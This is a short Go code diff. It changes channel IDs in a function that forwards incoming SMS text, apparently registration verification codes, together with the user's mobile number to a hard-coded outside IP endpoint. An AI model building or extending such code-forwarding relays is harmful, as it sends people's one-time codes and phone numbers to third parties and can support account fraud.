@@ -197,12 +197,12 @@ func processJindongRegister(msg string, user map[string]string, apid string) {
 	result := exp.FindStringSubmatch(msg)
 	if nil != result {
 		log.Println(result[1])
-		url := "http://121.201.67.189:9876/verifycode/api/getJDNET.jsp?cid=jdnet_108&pid=jd108&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		url := "http://121.201.67.189:9876/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
 		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
 		go send2Url(url)
 
 	} else {
-		url := "http://121.201.67.189:9876/verifycode/api/getJDNET.jsp?cid=jdnet_108&pid=jd108&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		url := "http://121.201.67.189:9876/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
 		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
 		go send2Url(url)
 	}
